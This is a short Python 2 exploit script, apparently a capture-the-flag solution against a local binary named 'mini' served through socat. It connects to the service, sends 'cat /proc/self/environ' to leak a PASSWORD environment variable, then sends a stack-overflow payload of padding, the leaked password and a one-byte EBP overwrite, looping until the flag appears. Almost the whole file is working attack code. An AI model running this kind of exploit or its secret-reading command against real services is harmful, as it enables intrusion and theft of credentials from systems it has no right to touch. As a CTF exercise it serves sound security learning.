#!/usr/bin/python
import sys
#from libctf import *
import socket 
import time

"""
the offset between the payload and EBP will be consistent 
but ASLR and other factors could change the actual address
so the one-byte EBP overwrite can be anything sensible
using "!" (0x21)

PASSWORD=ABCD1234 socat -d -d tcp4-l:5000,fork,reuseaddr exec:./mini

"""

#host,port = 'localhost',5000
host,port = 'localhost',9019


if __name__=='__main__':

   #payload = "cat flag " + "A"*111 + "B"*4 + "C"*4 + "D"*4 + "\x21"
   #payload = "cat flag " + "A"*111 + "X"*12 + "\x21"
   #sys.stdout.write(payload)

   flag = False 
   while not flag:
      #s = Sock('localhost', 5000)
      s = socket.create_connection((host,port))

      # get password from /proc/self/environ
      passwd = "CCCCDDDD"
      p1 = "cat /proc/self/environ\n"
      s.send(p1)
      out = s.recv(2048)
      
      for envvar in out.split("\0"):
	 if 'PASSWORD' in envvar:
	    envvar = envvar.strip(' $')
	    k,v = envvar.split('=')
	    passwd = v
	    #print '='.join((k,v))
	    break

      # overwrite EBP with '!' because stack moves every run so doesn't matter
      #p2 = "cat flag " + "A"*111 + passwd + "!quit\n"
      p2 = "cat flag " + "A"*111 + passwd + "!!!!!\n"
      #print "payload len: {}".format(len(p2))
      s.send(p2)
      out = s.recv(1024)

      if 'flag' in out:
	 print out
      	 flag = True

      else:
      	 time.sleep(1)
   
